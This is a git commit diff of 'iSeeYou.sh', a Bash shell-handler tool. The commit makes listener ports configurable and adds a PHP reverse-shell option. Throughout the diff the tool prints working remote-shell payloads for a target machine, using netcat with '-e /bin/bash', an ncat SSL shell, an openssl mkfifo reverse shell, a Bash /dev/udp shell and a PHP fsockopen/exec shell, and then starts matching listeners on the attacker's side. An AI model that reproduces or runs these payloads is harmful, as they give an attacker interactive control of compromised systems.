46853b9174af89eaafcf30f8aa955ebccc92d5b2
Fadester <53977560+Fadester@users.noreply.github.com>
2022-02-21 16:08:10 +0100

    Update iSeeYou.sh

--- iSeeYou.sh
+++ iSeeYou.sh
@@ -2,7 +2,6 @@
 #coded by Fadester
 #v1.0
 
-
 #colors
 
 green='\033[1;32m'
@@ -19,7 +18,7 @@ white='\e[1;37m'
 
 dir=$(pwd)
 
-trap ctrl_c INT  
+trap ctrl_c INT
 ctrl_c() {
   echo
   echo -e "$BlueF[$red!$BlueF]$red Exit... $farblos"
@@ -148,6 +147,7 @@ echo -e "$BlueF[$green""1$BlueF]$yellow Netcat $farblos"
 echo -e "$BlueF[$green""2$BlueF]$yellow Ncat $farblos"
 echo -e "$BlueF[$green""3$BlueF]$yellow OpenSSL $farblos"
 echo -e "$BlueF[$green""4$BlueF]$yellow Bash UDP $farblos"
+echo -e "$BlueF[$green""5$BlueF]$yellow PHP $farblos"
 echo
 read -p $'\e[1;34m[\e[35mChoice\e[1;34m]\e[1;34m >> \e[1;37m' eingabe1
 if [[ $eingabe1 == "1" ]]; then
@@ -158,6 +158,8 @@ elif [[ $eingabe1 == 3 ]]; then
   openssl_shell
 elif [[ $eingabe1 == 4 ]]; then
   bashUDP_shell
+elif [[ $eingabe1 == 5 ]]; then
+  php_shell
 else
   echo -e "$BlueF[$red!$BlueF]$red Invalid option! $farblos"
 fi
@@ -167,12 +169,14 @@ shell_manually() {
 echo
 echo -e "$BlueF[$yellow*$BlueF]$green Attacking System:$magenta Linux $farblos"
 read -p $'\e[1;34m[\033[1;32m+\e[1;34m]\033]\033[1;32m Target IP address:\e[1;37m ' target_ip
-echo -e "$BlueF[$red!$BlueF]$yellow Execute code: nc -l -p 6996 -e /bin/bash $farblos"
+echo -ne "$BlueF[$green+$BlueF]$green Port: $farblos"
+read port
+echo -e "$BlueF[$red!$BlueF]$yellow Execute code:$red nc -l -p $port -e /bin/bash $farblos"
 sleep 0.5
-echo -e "$BlueF[$green*$BlueF]$green Starting listener... $farblos"
+echo -e "$BlueF[$green*$BlueF]$green Starting listener on port:$red $port$farblos... $farblos"
 sleep 0.5
 while [[ true ]]; do
-  nc -v $target_ip 6996
+  nc -v $target_ip $port
   sleep 1
 done
 
@@ -182,18 +186,22 @@ done
 shell_ncat() {
 echo
 echo -e "$BlueF[$yellow*$BlueF]$green Attacking System:$magenta Linux $farblos"
-echo -e "$BlueF[$red!$BlueF]$yellow Execute code: ncat 0.0.0.0 4242 --ssl -e /bin/bash -v $farblos"
+echo -ne "$BlueF[$green+$BlueF]$green Port: $farblos"
+read port
+echo -e "$BlueF[$red!$BlueF]$yellow Execute code:$red ncat 0.0.0.0 $port --ssl -e /bin/bash $farblos"
 sleep 0.5
-echo -e "$BlueF[$green*$BlueF]$green Starting listener on port 4242... $farblos"
-ncat -l 4242 --ssl -v
+echo -e "$BlueF[$green*$BlueF]$green Starting listener on port$red $port$farblos..."
+ncat -l $port --ssl -v
 }
 
 openssl_shell() {
 
 echo -e "$BlueF[$yellow*$BlueF]$green Attacking System:$magenta Linux $farblos"
-echo -e "$BlueF[$green+$BlueF]$green Starting listener on port 4242.... $farblos"
-echo -e "$BlueF[$red!$BlueF]$yellow Execute code: mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $ip4:4242 > /tmp/s; rm /tmp/s" $farblos
-ncat --ssl -v -l -p 4242
+echo -ne "$BlueF[$green+$BlueF]$green Port: $farblos"
+read port
+echo -e "$BlueF[$red!$BlueF]$yellow Execute code:$red mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $ip4:$port > /tmp/s; rm /tmp/s" $farblos
+echo -e "$BlueF[$green+$BlueF]$green Starting listener on port$red $port$farblos..."
+ncat --ssl -v -l -p $port
 
 
 }
@@ -202,15 +210,24 @@ bashUDP_shell() {
 
 
 echo -e "$BlueF[$yellow*$BlueF]$green Attacking System:$magenta Linux $farblos"
-echo -e "$BlueF[$green+$BlueF]$green Starting listener on port 4242.... $farblos"
-echo -e "$BlueF[$red!$BlueF]$yellow Execute code: sh -i >& /dev/udp/$ip4/4242 0>&1" $farblos
-nc -u -lvp 4242 -s $ip4 
+echo -ne "$BlueF[$green+$BlueF]$green Port: $farblos"
+read port
+echo -e "$BlueF[$red!$BlueF]$yellow Execute code:$red sh -i >& /dev/udp/$ip4/$port 0>&1" $farblos
+echo -e "$BlueF[$green+$BlueF]$green Starting listener on port$red $port$farblos..."
+nc -u -lvp $port -s $ip4
 }
 
-shell_eingabe() {
-  while [[ true ]]; do
-    echo -e "$BlueF[$green::$BlueF]$green Command: $farblos"
-  done
+php_shell() {
+
+echo -e "$BlueF[$yellow*$BlueF]$green Attacking System: Linux $farblos"
+echo -ne "$BlueF[$green+$BlueF]$green Port: $farblos"
+read port
+phpshell=$(cat phpshell.txt)
+#printf $'\e[1;34m[\e[1;91m!\e[1;34m]\e[0m\e[1;93m Execute code: php -r '$sock=fsockopen("$ip4",$port);exec("/bin/sh -i <&3 >&3 2>&3");''
+echo -e "$BlueF[$red!$BlueF]$yellow Execute code:$red $phpshell $farblos"
+echo -e "$BlueF[$red!$BlueF]$yellow Replace IP and PORT with:$red $ip4 $port$farblos! "
+echo -e "$BlueF[$yellow*$BlueF]$green Starting listener on port:$red $port$farblos..."
+nc -l $port
 }
 
 banner
